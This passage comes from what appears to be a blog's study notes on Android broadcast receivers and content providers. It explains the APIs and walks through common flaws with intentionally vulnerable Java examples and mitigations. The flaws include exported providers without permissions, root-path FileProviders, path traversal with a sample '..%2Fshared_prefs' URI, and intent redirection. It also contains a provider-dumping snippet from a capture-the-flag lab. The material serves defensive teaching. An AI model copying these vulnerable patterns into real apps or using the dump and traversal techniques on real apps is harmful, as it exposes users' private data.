unregisterReceiver(secureReceiver); } } } 3. Use LocalBroadcastManager for Internal Communication # Implementation # public class SecureInternalCommunication extends Activity { private LocalBroadcastManager localBroadcastManager; private BroadcastReceiver localReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); localBroadcastManager = LocalBroadcastManager.getInstance(this); // SECURE: Local receiver only receives broadcasts from same app localReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Safe to process - sender is guaranteed to be same app String sensitiveData = intent.getStringExtra(\u0026#34;internal_data\u0026#34;); processSensitiveData(sensitiveData); } }; IntentFilter filter = new IntentFilter(\u0026#34;com.example.INTERNAL_BROADCAST\u0026#34;); localBroadcastManager.registerReceiver(localReceiver, filter); } public void sendSecureInternalBroadcast() { Intent intent = new Intent(\u0026#34;com.example.INTERNAL_BROADCAST\u0026#34;); intent.putExtra(\u0026#34;internal_data\u0026#34;, \u0026#34;sensitive_information\u0026#34;); // SECURE: Broadcast stays within the app localBroadcastManager.sendBroadcast(intent); } private void processSensitiveData(String data) { // Safe processing of internal data } @Override protected void onDestroy() { super.onDestroy(); if (localReceiver != null) { localBroadcastManager.unregisterReceiver(localReceiver); } } } 4. Use Explicit Intents and Callbacks # Implementation # public class SecureDataSender extends Activity { public void sendDataSecurely() { // SECURE: Use explicit intent to specific receiver Intent intent = new Intent(this, SpecificReceiver.class); intent.setAction(\u0026#34;com.example.SECURE_ACTION\u0026#34;); // Safe to include sensitive data in explicit intent intent.putExtra(\u0026#34;session_token\u0026#34;, \u0026#34;abc123xyz789\u0026#34;); intent.putExtra(\u0026#34;user_id\u0026#34;, \u0026#34;12345\u0026#34;); // Send to specific component only sendBroadcast(intent); } public void useCallbackInstead() { // SECURE: Better approach - use callback instead of broadcast performAsyncOperation(new AsyncCallback() { @Override public void onComplete(String result) { // Handle completion securely processSensitiveResult(result); } @Override public void onError(String error) { // Handle error securely handleError(error); } }); } private void performAsyncOperation(AsyncCallback callback) { // Perform operation and call callback } private void processSensitiveResult(String result) { // Process sensitive result } private void handleError(String error) { // Handle error } interface AsyncCallback { void onComplete(String result); void onError(String error); } } 5. Comprehensive Input Validation # Implementation # public class ValidatingReceiver extends BroadcastReceiver { private static final int MAX_INPUT_LENGTH = 256; private static final Pattern SAFE_PATTERN = Pattern.compile(\u0026#34;^[a-zA-Z0-9\\\\s-_]+$\u0026#34;); @Override public void onReceive(Context context, Intent intent) { try { // SECURE: Comprehensive input validation if (!validateIntentStructure(intent)) { Log.w(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Invalid intent structure\u0026#34;); return; } String userInput = intent.getStringExtra(\u0026#34;user_input\u0026#34;); if (!isValidInput(userInput)) { Log.w(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Invalid input blocked\u0026#34;); return; } // Process validated input processValidatedInput(context, userInput); } catch (Exception e) { Log.e(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Error processing broadcast\u0026#34;, e); // Fail securely - don\u0026#39;t expose error details } } private boolean validateIntentStructure(Intent intent) { // Validate intent has expected structure return intent != null \u0026amp;\u0026amp; intent.getAction() != null \u0026amp;\u0026amp; intent.getAction().startsWith(\u0026#34;com.example.\u0026#34;); } private boolean isValidInput(String input) { if (input == null || input.isEmpty()) { return false; } // Length validation if (input.length() \u0026gt; MAX_INPUT_LENGTH) { return false; } // Pattern validation return SAFE_PATTERN.matcher(input).matches(); } private void processValidatedInput(Context context, String input) { // Safe to process validated input Log.d(\u0026#34;ValidatingReceiver\u0026#34;, \u0026#34;Processing: \u0026#34; + input); } } Resources # Broadcast Receiver in Android With Example Docs Broadcast Implicit broadcast exceptions ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/broadcast/","section":"","summary":"","title":"Broadcast","type":"posts"},{"content":" Summary # A way to manage access to data and make sharing this data with other applications easier. Think of it like having notes saved in one app (A) that you want other apps (B,C,D etc\u0026hellip;) to access - but they\u0026rsquo;re saved locally so Android will deny access for any other app. OK Simple, just call the provider and it will provide it for us! üòÑ\nThey are designed to manage access to data and Makes sharing this data with other applications easier. They encapsulate the data and act as an interface connecting data in one process with code running in another process, Each row represents an instance of data, and each column represents an individual piece of data for that instance\n[!INFO] Who can access Content Providers?\nYour own app components - Activities, Services, Broadcast Receivers Other applications - If properly configured with permissions System apps - Android framework components like sync adapters Widgets - Home screen widgets that need app data Third-party apps - With appropriate permissions and export settings What is a File Provider? # A \u0026ldquo;file provider\u0026rdquo; is not a separate Android component. Instead, It\u0026rsquo;s a Content Provider that is specifically designed and configured to manage and share file-based data.\nWhat Content Providers Look Like # Core Components # 1. Provider Client (ContentResolver) # Accessing data from a content provider\nWhen an application wants to access data in a content provider, it uses the ContentResolver object available in its Context. The ContentResolver communicates with the provider object, performs the requested action, and returns results.\nBasic CRUD Operations:\n// Get ContentResolver ContentResolver resolver = getContentResolver(); // Query data Cursor cursor = resolver.query( uri, // Content URI projection, // Columns to return selection, // WHERE clause selectionArgs, // WHERE clause arguments sortOrder // Sort order ); // Insert data ContentValues values = new ContentValues(); values.put(\u0026#34;column_name\u0026#34;, \u0026#34;value\u0026#34;); Uri newUri = resolver.insert(uri, values); // Update data int rowsUpdated = resolver.update(uri, values, selection, selectionArgs); // Delete data int rowsDeleted = resolver.delete(uri, selection, selectionArgs); Bonus query code # This will return all data that the uri can access in database\nCursor cursor = getContentResolver().query( Uri.parse(\u0026#34;content://io.hextree.flag30/success\u0026#34;), null, null, null, null ); // dump Uri if (cursor!=null \u0026amp;\u0026amp; cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) { sb.append(\u0026#34;, \u0026#34;); } sb.append(cursor.getColumnName(i) + \u0026#34; = \u0026#34; + cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } 2. Provider (ContentProvider subclass) # The actual implementation that manages access to data\npublic class MyContentProvider extends ContentProvider { @Override public boolean onCreate() { // Initialize provider (keep it fast!) return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Return data based on query return cursor; } @Override public Uri insert(Uri uri, ContentValues values) { // Insert new data and return URI return newUri; } @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { // Update existing data return rowsAffected; } @Override public int delete(Uri uri, String selection, String[] selectionArgs) { // Delete data return rowsDeleted; } @Override public String getType(Uri uri) { // Return MIME type for the URI return mimeType; } } Built-in Content Providers # Android includes many system content providers including :\nUser Dictionary Provider: Non-standard words for spellcheck Contacts Provider: User contact information MediaStore: Images, videos, audio files on device Calendar Provider: Calendar events and data Creating Custom Content Providers # 1. Design Data Storage # For structured data:\nDecide storage mechanism (SQLite, files, etc.) Data must have primary key column (often BaseColumns._ID) For file data (unstructured):\nUse file-oriented APIs You can mix and match different storage types and expose them through a single content provider Example of a DB that is prover can query # public class FlagDatabaseHelper extends SQLiteOpenHelper { public static final String COLUMN_CONTENT = \u0026#34;content\u0026#34;; public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_TITLE = \u0026#34;title\u0026#34;; public static final String COLUMN_VALUE = \u0026#34;value\u0026#34;; public static final String COLUMN_VISIBLE = \u0026#34;visible\u0026#34;; private static final String CREATE_TABKE_NOTE = \u0026#34;CREATE TABLE Note (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, content TEXT NOT NULL );\u0026#34;; private static final String CREATE_TABLE_FLAG = \u0026#34;CREATE TABLE Flag (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, visible INTEGER NOT NULL DEFAULT 1);\u0026#34;; private static final String DATABASE_NAME = \u0026#34;flag.db\u0026#34;; private static final int DATABASE_VERSION = 1; public static final String TABLE_FLAG = \u0026#34;Flag\u0026#34;; public static final String TABLE_NOTE = \u0026#34;Note\u0026#34;; public FlagDatabaseHelper(Context context) { super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1); } @Override // android.database.sqlite.SQLiteOpenHelper public void onCreate(SQLiteDatabase sQLiteDatabase) { Log.i(\u0026#34;FlagDatabaseHelper\u0026#34;, \u0026#34;database created\u0026#34;); sQLiteDatabase.execSQL(CREATE_TABLE_FLAG); sQLiteDatabase.execSQL(CREATE_TABKE_NOTE); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag30\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag31\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag32\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 0);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;secret\u0026#39;, \u0026#39;This is a secret note\u0026#39;);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;flag33\u0026#39;, \u0026#39;HXT{censored}\u0026#39;);\u0026#34;); } @Override // android.database.sqlite.SQLiteOpenHelper public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) { sQLiteDatabase.execSQL(\u0026#34;DROP TABLE IF EXISTS Flag\u0026#34;); onCreate(sQLiteDatabase); } From here we can see names an columns and how many table we have\nDatabase Structure # Database Name: flag.db\nTables:\nFlag - Stores flag information\nNote - Stores notes (potentially containing additional flags)\nFlag Table Schema # Column Type Description _id INTEGER (PK) Auto-incrementing ID name TEXT Flag name (e.g., flag30, flag31) value TEXT Flag value (e.g., HXT{censored}) visible INTEGER Visibility flag (1 = visible, 0 = hidden) Note Table Schema # Column Type Description _id INTEGER (PK) Auto-incrementing ID title TEXT Note title content TEXT Note content Flag Table (Initial Entries) # name value visible flag30 HXT{censored} 1 (visible) flag31 HXT{censored} 1 (visible) flag32 HXT{censored} 0 (hidden) Note Table (Initial Entries) # title content secret This is a secret note flag33 HXT{censored} 2. Implement ContentProvider # Create subclass implementing six abstract methods:\npublic class CustomProvider extends ContentProvider { // Must be thread-safe (except onCreate) @Override public boolean onCreate() { // Fast initialization only - defer heavy tasks return true; } // Implement CRUD operations... // (See code examples above) } 3. Define Metadata # Create a contract class with constants:\npublic final class ProviderContract { public static final String AUTHORITY = \u0026#34;com.example.provider\u0026#34;; public static final Uri BASE_URI = Uri.parse(\u0026#34;content://\u0026#34; + AUTHORITY); public static final class TableName { public static final Uri URI = Uri.withAppendedPath(BASE_URI, \u0026#34;table\u0026#34;); public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; } } Authority (android:authorities): This is the symbolic name that uniquely identifies your provider within the system. Use reverse internet domain ownership (e.g., com.example.yourapp.provider) to avoid conflicts Content URIs: URIs identify data in your provider. They combine the content:// scheme, the provider\u0026rsquo;s authority, and a path that points to a table or file (e.g., content://user_dictionary/words) Handling Content URI IDs: By convention, content URIs can include an ID value appended to the path (e.g., content://user_dictionary/words/4) to refer to a single row. The UriMatcher class can be used to map URI patterns (using wildcards like * for any string and # for any numeric string) to integer values, allowing you to easily handle different types of URI requests in a switch statement 4. Manifest Registration # Register in AndroidManifest.xml with proper authorities and permissions.\nUse Cases # 1- Secure Data Sharing # They allow other applications to securely access and modify your app\u0026rsquo;s data with proper permission controls.\n2- Data Abstraction # Content providers abstract away the details of underlying data storage. You can change your internal data storage implementation (e.g., from SQLite to files) without affecting other applications.\n3- More Permission Control # Greater control over permissions for accessing data:\nRestrict access to only your application Grant blanket permission to other applications Configure different permissions for reading vs writing data 4- Framework Integration # Several Android classes rely on ContentProvider:\nAbstractThreadedSyncAdapter for server synchronization CursorAdapter and CursorLoader for async UI data loading Custom search suggestions implementation Widget data exposure Complex data copy/paste operations File Provider Implementation # How Content Providers Handle Files # When a content provider is used to share files, it manages file data such as photos, audio, or videos. Rather than storing large file data directly in a table, it is recommended to store the data in a file (preferably in your application\u0026rsquo;s private space) and then provide indirect access or a handle to that file when requested by another application.\nFor content providers that offer files, you are expected to implement the getStreamTypes() method, which returns a string array of MIME types (e.g., \u0026ldquo;image/jpeg\u0026rdquo;, \u0026ldquo;image/png\u0026rdquo;) for the files your provider can return for a given content URI.\n[!WARNING] External Storage Security If files are stored on external storage, they are typically public and world-readable by default, and a content provider cannot restrict access to them through its own permissions, as other applications can use different API calls to read and write them directly. To ensure control over access to your data, you should store it in internal files, SQLite databases, or cloud storage, and keep these private to your application.\nConfiguration \u0026amp; Permissions # Manifest Declaration # \u0026lt;provider android:name=\u0026#34;.MyContentProvider\u0026#34; android:authorities=\u0026#34;com.example.provider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.READ_WRITE_PERMISSION\u0026#34; android:readPermission=\u0026#34;com.example.READ_PERMISSION\u0026#34; android:writePermission=\u0026#34;com.example.WRITE_PERMISSION\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;!-- Path-specific permissions --\u0026gt; \u0026lt;path-permission android:path=\u0026#34;/sensitive/*\u0026#34; android:readPermission=\u0026#34;com.example.SENSITIVE_READ\u0026#34; /\u0026gt; \u0026lt;!-- Temporary URI permissions --\u0026gt; \u0026lt;grant-uri-permission android:pathPattern=\u0026#34;/temp/*\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; Some Key Attributes # android:exported # Default behavior changed in API 17: Defaults to false if no intent filters If intent filters are defined, defaults to true unless explicitly set to false External calls are blocked by activity manager if not exported (unless calling process is root/system) Permission Levels # Provider-level: android:permission (single read/write) android:readPermission / android:writePermission (separate permissions) Separate permissions take precedence over single permission Path-level: \u0026lt;path-permission\u0026gt; child elements Apply to specific content URI paths Take precedence over provider-level permissions Temporary URI Permissions # These grant temporary access to a specific content URI, reducing the need for an app to request permanent permissions in its manifest. Enabled by android:grantUriPermissions=\u0026quot;true\u0026quot; or \u0026lt;grant-uri-permission\u0026gt; Granted via setting intent flags to: FLAG_GRANT_READ_URI_PERMISSION or FLAG_GRANT_WRITE_URI_PERMISSION when sending the content URI to another application. Automatically revoked when receiving activity finishes Data Types and MIME Types # Supported Data Types # Content providers can manage various data storage sources:\nStructured data (like a SQLite relational database) Unstructured data such as image files, audio, or video media Binary Large Objects (BLOBs) - implemented as byte arrays For file-oriented data (images/videos), store in files and provide indirect access MIME Type Conventions # // Standard MIME types for common data \u0026#34;text/html\u0026#34; \u0026#34;image/jpeg\u0026#34; // Android vendor-specific MIME types for table data // Multiple rows \u0026#34;vnd.android.cursor.dir/vnd.com.example.provider.table1\u0026#34; // Single row \u0026#34;vnd.android.cursor.item/vnd.example.line2\u0026#34; // Get MIME type programmatically String mimeType = getContentResolver().getType(uri); Common Vulnerabilities # 1. Overly open Access Controls # Vulnerability # Default exported state: Historically public by default (changed in API 17) Missing permissions: No read/write permissions set Inadequate permissions: Generic permissions for sensitive data Vulnerable Code Example # // Manifest: AndroidManifest.xml /* \u0026lt;provider android:name=\u0026#34;.MyContentProvider\u0026#34; android:authorities=\u0026#34;com.example.myapp.provider\u0026#34; android:exported=\u0026#34;true\u0026#34; /\u0026gt; */ public class MyContentProvider extends ContentProvider { private DatabaseHelper dbHelper; @Override public boolean onCreate() { dbHelper = new DatabaseHelper(getContext()); return true; } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { // Vulnerable: No permission checks, exposes sensitive data to any app SQLiteDatabase db = dbHelper.getReadableDatabase(); return db.query(\u0026#34;sensitive_table\u0026#34;, projection, selection, selectionArgs, null, null, sortOrder); } // Other required methods (insert, update, delete, getType) omitted for brevity } Mitigation # \u0026lt;!-- Explicitly set exported and permissions --\u0026gt; \u0026lt;provider android:name=\u0026#34;.MyProvider\u0026#34; android:authorities=\u0026#34;com.example.provider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.permission.SIGNATURE_REQUIRED\u0026#34; /\u0026gt; \u0026lt;!-- Use signature-level protection for sensitive data --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.permission.SIGNATURE_REQUIRED\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; 2. Improperly Exposed Directories to FileProvider # Vulnerability # An improperly configured FileProvider can expose files and directories to an attacker. This often occurs when the FileProvider configuration uses broad path elements, such as \u0026lt;root-path\u0026gt;, which corresponds to the device\u0026rsquo;s root directory (/), or shares a wide path range like . or /.\nUsing root-path allowing arbitrary file access Sharing entire private directories (files, cache) General-purpose providers instead of specific ones Attack # Allowing \u0026lt;root-path\u0026gt; grants arbitrary access to files and folders, including an app\u0026rsquo;s sandbox and /sdcard directory, presenting a broad attack surface. This can enable an attacker to access sensitive information stored in databases or overwrite the application\u0026rsquo;s native libraries, potentially leading to arbitrary code execution.\nVulnerable Code Example # // res/xml/file_paths.xml: /* \u0026lt;paths\u0026gt; \u0026lt;root-path name=\u0026#34;root\u0026#34; path=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/paths\u0026gt; */ // Manifest: AndroidManifest.xml /* \u0026lt;provider android:name=\u0026#34;androidx.core.content.FileProvider\u0026#34; android:authorities=\u0026#34;com.example.myapp.fileprovider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/file_paths\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; */ public class FileShareActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); File file = new File(\u0026#34;/path/to/file\u0026#34;); // Vulnerable: Broad path exposes entire filesystem Uri uri = FileProvider.getUriForFile(this, \u0026#34;com.example.myapp.fileprovider\u0026#34;, file); Intent shareIntent = new Intent(Intent.ACTION_SEND); shareIntent.setData(uri); shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); startActivity(shareIntent); } } Mitigation # \u0026lt;!-- file_paths.xml - SECURE configuration --\u0026gt; \u0026lt;paths xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt; \u0026lt;!-- Specific subdirectory only --\u0026gt; \u0026lt;cache-path name=\u0026#34;shared_images\u0026#34; path=\u0026#34;images/\u0026#34; /\u0026gt; \u0026lt;!-- NOT entire cache: \u0026lt;cache-path name=\u0026#34;cache\u0026#34; path=\u0026#34;.\u0026#34; /\u0026gt; --\u0026gt; \u0026lt;/paths\u0026gt; \u0026lt;!-- Manifest --\u0026gt; \u0026lt;provider android:name=\u0026#34;androidx.core.content.FileProvider\u0026#34; android:authorities=\u0026#34;${applicationId}.fileprovider\u0026#34; android:exported=\u0026#34;false\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.support.FILE_PROVIDER_PATHS\u0026#34; android:resource=\u0026#34;@xml/file_paths\u0026#34; /\u0026gt; \u0026lt;/provider\u0026gt; Additional Mitigations:\nDo not use the \u0026lt;root-path\u0026gt; path element: This element grants arbitrary access to the entire device\u0026rsquo;s root directory Share narrow path ranges: Instead of broad path ranges like . or /, specify limited and narrow paths in the FileProvider configuration Grant minimum access permissions: When granting content URI permissions, ensure only the minimum necessary access is given Avoid \u0026lt;external-path\u0026gt; for sensitive data: Sensitive data should not be stored in external storage accessible via \u0026lt;external-path\u0026gt; 3. Path Traversal when using data from Uri # Vulnerability # This common mistake occurs when developers use data from Uri methods like Uri.getLastPathSegment() or Uri.getPathSegments() without proper validation before passing it to file system APIs. These methods decode URL-encoded values, which attackers can exploit.\nUsing Uri.getLastPathSegment() without validation URL-decoded values allowing ..%2F injection Trusting ContentProvider-provided filenames Attack # An attacker can provide a URL-encoded path traversal sequence (e.g., %2F for /) within a URI. When the vulnerable app decodes and uses this URI segment, it can be tricked into accessing or modifying files outside the intended directory. For example, an attacker could craft a URI like content://com.victim.path_traversal/..%2Fshared_prefs%2Fsecrets.xml to retrieve the contents of the secrets.xml file, which is typically stored in a private directory.\nVulnerable Code Example # public class FileAccessActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Uri uri = getIntent().getData(); if (uri != null) { // Vulnerable: No validation of fileName allows path traversal String fileName = uri.getLastPathSegment(); File file = new File(getFilesDir(), fileName); if (file.exists()) { try { FileInputStream fis = new FileInputStream(file); // Process file } catch (FileNotFoundException e) { e.printStackTrace(); } } } } } Mitigation # // SECURE: Validate file paths private File getSecureFile(Uri uri) { String filename = uri.getLastPathSegment(); if (filename == null) return null; // Re-encode to prevent path traversal filename = Uri.encode(filename); File file = new File(getSecureDirectory(), filename); try { // Validate canonical path is within expected directory String canonicalPath = file.getCanonicalPath(); String secureDir = getSecureDirectory().getCanonicalPath(); if (!canonicalPath.startsWith(secureDir)) { throw new SecurityException(\u0026#34;Path traversal attempt detected\u0026#34;); } return file; } catch (IOException e) { return null; } } // Generate unique filenames instead of trusting input private String generateUniqueFilename(String extension) { return UUID.randomUUID().toString() + \u0026#34;.\u0026#34; + extension; } Additional Mitigations:\nValidate the resulting path: Canonicalize the path using File.getCanonicalPath() and compare its prefix with the expected safe directory Implement additional validation: Include checks to prevent accidental overwrites and confirm operations occur in the expected directory Avoid sharing broad folders in Content Providers: Ensure Content Providers do not expose \u0026ldquo;broad\u0026rdquo; folders like files or cache 4. Trusting ContentProvider-Provided Filename # Vulnerability # If a client application doesn\u0026rsquo;t correctly handle a filename provided by a FileProvider, a malicious application can implement its own FileProvider to provide a crafted filename.\nAttack # A malicious FileProvider can supply a filename that includes path traversal characters (e.g., ../). When the victim client application attempts to write the received file to its storage using this untrusted filename, it might overwrite its own critical files, such as application code, shared preferences, or other configuration files, potentially leading to malicious code execution or altered application behavior.\nVulnerable Code Example # public class FileWriteActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Uri uri = getIntent().getData(); if (uri != null) { // Vulnerable: Uses untrusted filename directly String fileName = uri.getLastPathSegment(); File outputFile = new File(getFilesDir(), fileName); try { OutputStream os = new FileOutputStream(outputFile); // Write data to outputFile } catch (FileNotFoundException e) { e.printStackTrace(); } } } } Mitigation # Don\u0026rsquo;t trust user input for filenames: When a client application writes a received file, it should ignore the filename provided by the \u0026ldquo;server\u0026rdquo; application and instead generate its own unique filename Sanitize provided filenames (less desirable): If unique filenames cannot be generated, sanitize the provided filename by removing path traversal characters and performing canonicalization 5. Exploiting Implicit Intents for File Theft and Overwriting # Vulnerability # Applications often launch implicit intents (e.g., ACTION_PICK, GET_CONTENT, IMAGE_CAPTURE) to interact with other apps, such as file managers or camera apps, to obtain a URI to a file. If the vulnerable app then copies the content from this URI to its public storage or processes it insecurely, it can be exploited.\nAttack for File Theft # A malicious app can register an intent-filter with a high priority (android:priority=\u0026quot;999\u0026quot;) to intercept these implicit intents. Instead of providing a legitimate file, the malicious app returns a file:// URI that points to a sensitive file within the victim app\u0026rsquo;s private directory. When the victim app receives this malicious URI and attempts to copy its content, it unknowingly copies its own private data to a public directory, which the attacker can then read.\nAttack for Arbitrary File Overwriting # Similarly, an attacker can use a malicious ContentProvider to return a filename that contains path traversal. If the vulnerable app copies the content using this filename, it could write arbitrary data to a sensitive location, like a native library file (.so), which could lead to arbitrary code execution within the victim app\u0026rsquo;s context.\nVulnerable Code Example # public class FilePickerActivity extends Activity { private static final int REQUEST_CODE = 1; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent intent = new Intent(Intent.ACTION_GET_CONTENT); intent.setType(\u0026#34;*/*\u0026#34;); startActivityForResult(intent, REQUEST_CODE); } @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == REQUEST_CODE \u0026amp;\u0026amp; resultCode == RESULT_OK) { Uri uri = data.getData(); // Vulnerable: No validation of URI source File publicFile = new File(Environment.getExternalStorageDirectory(), \u0026#34;public_file\u0026#34;); try { InputStream is = getContentResolver().openInputStream(uri); OutputStream os = new FileOutputStream(publicFile); byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1) { os.write(buffer, 0, len); } is.close(); os.close(); } catch (IOException e) { e.printStackTrace(); } } } } Mitigation # Use internal storage for sensitive data: Always store sensitive application data in internal storage, which is restricted to the owning application Avoid public file storage: Do not use public file storage for caching or any other operations with sensitive data Encrypt sensitive data: If sensitive data must be stored on external storage, it should be encrypted using a strong algorithm Perform integrity checks: For data or code loaded from external storage, implement integrity checks using hashes Make intents explicit: Unless absolutely required, use explicit intents by calling setPackage() Omit sensitive information from implicit intents: Do not include sensitive information or mutable objects Validate external URIs: Check URIs from file:// or content:// schemes to ensure they do not point to local private files 6. Proxying Requests to More Secure Providers # Vulnerability # Lower-permission provider proxying to higher-permission provider Dynamic URIs allowing attacker control over target provider Note on Vulnerable Code Example # The vulnerable code example for this vulnerability is complex and typically involves multiple ContentProviders. It involves a less secure provider forwarding requests to a secure one without proper authorization.\nMitigation # // SECURE: Validate incoming URIs with allowlist private static final Set\u0026lt;String\u0026gt; ALLOWED_AUTHORITIES = Set.of( \u0026#34;com.example.safe.provider1\u0026#34;, \u0026#34;com.example.safe.provider2\u0026#34; ); private boolean isUriSafe(Uri uri) { String authority = uri.getAuthority(); return ALLOWED_AUTHORITIES.contains(authority); } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { if (!isUriSafe(uri)) { throw new SecurityException(\u0026#34;Unauthorized provider access attempt\u0026#34;); } // Safe to proceed... } 7. Theft of Arbitrary Files via File Choosers in WebView # Vulnerability # If an app implements WebChromeClient.onShowFileChooser() to allow users to select files from their device, but without proper validation of the chosen file\u0026rsquo;s URI, it can be vulnerable.\nAttack # An attacker can provide a specially crafted URL to the WebView that includes an \u0026lt;input type=\u0026quot;file\u0026quot;\u0026gt; element. The attacker\u0026rsquo;s app can then intercept the implicit intent launched by onShowFileChooser() and return the URI of a protected file from the victim\u0026rsquo;s private storage. The WebView then receives this URI and can potentially leak the content of the protected file.\nVulnerable Code Example # public class WebViewActivity extends Activity { private static final int REQUEST_CODE = 1; private ValueCallback\u0026lt;Uri[]\u0026gt; filePathCallback; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); WebView webView = new WebView(this); setContentView(webView); webView.setWebChromeClient(new WebChromeClient() { @Override public boolean onShowFileChooser(WebView webView, ValueCallback\u0026lt;Uri[]\u0026gt; filePathCallback, FileChooserParams fileChooserParams) { // Vulnerable: No validation of chosen file WebViewActivity.this.filePathCallback = filePathCallback; Intent intent = fileChooserParams.createIntent(); startActivityForResult(intent, REQUEST_CODE); return true; } }); } @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == REQUEST_CODE \u0026amp;\u0026amp; resultCode == RESULT_OK) { Uri result = data.getData(); filePathCallback.onReceiveValue(new Uri[]{result}); } } } Mitigation # Disable file access in WebSettings: Set WebSettings.setAllowFileAccess(false), WebSettings.setAllowFileAccessFromFileURLs(false), and WebSettings.setAllowUniversalAccessFromFileURLs(false) Disable content access in WebSettings: Call WebSettings.setAllowContentAccess(false) Use WebViewAssetLoader: This method provides a secure way to access local files via an http(s):// scheme Validate all URLs and origins: When loading external links in WebView, rigorously validate both the scheme and host Sanitize JavaScript with external data: Ensure any externally obtained data used with JavaScript has been properly sanitized Prevent WebView from loading untrusted content: If JavaScript execution and file access are enabled, strictly limit content loaded to trusted URLs 8. Gaining Access via Intent Redirection to Protected Components # Vulnerability # An app with an exported activity that takes an Intent from outside and returns it via Activity.setResult() without filtering unsafe flags, can be forced to grant permissions to Content Providers with the android:grantUriPermissions=\u0026quot;true\u0026quot; flag.\nAttack # An attacker sends an intent to this vulnerable activity. This intent includes a data URI pointing to the target ContentProvider and sets flags like Intent.FLAG_GRANT_READ_URI_PERMISSION. Because the vulnerable activity automatically returns the received intent (with its flags) via setResult(), the attacker\u0026rsquo;s app receives this modified intent back, now possessing the granted read permission for the specified URI. This allows the attacker to steal or rewrite protected or arbitrary files belonging to the victim application.\nVulnerable Code Example # public class VulnerableActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); // Vulnerable: Returns intent without filtering flags Intent intent = getIntent(); setResult(RESULT_OK, intent); finish(); } } Mitigation # Never redirect Intents in full: Instead of returning an Intent entirely, filter it to include only necessary data and remove any unsafe flags Filter intent flags: Ensure that flags like FLAG_GRANT_READ_URI_PERMISSION and FLAG_GRANT_WRITE_URI_PERMISSION are handled securely Validate intent components: When an Intent is created from a URL in WebView, reset the component and selector fields Check if activity is exported: Before launching an activity from a URL-derived Intent, verify that the target activity is explicitly exported Don\u0026rsquo;t export sensitive components: Avoid exporting components that access sensitive resources unless absolutely necessary Require permissions for sensitive tasks: For any exported component performing sensitive tasks, explicitly require appropriate permissions Apply signature-based permissions: When sharing data between your own ecosystem of apps, use signature protection level permissions Implement single-task endpoints: Design components to perform a small, specific set of tasks with granular privileges 9. SQL Injection in Shared Databases # Vulnerability # Multiple providers sharing same SQLite database SQL injection in less secure provider affecting secure provider\u0026rsquo;s data Vulnerable Code Example # public class VulnerableContentProvider extends ContentProvider { private DatabaseHelper dbHelper; @Override public boolean onCreate() { dbHelper = new 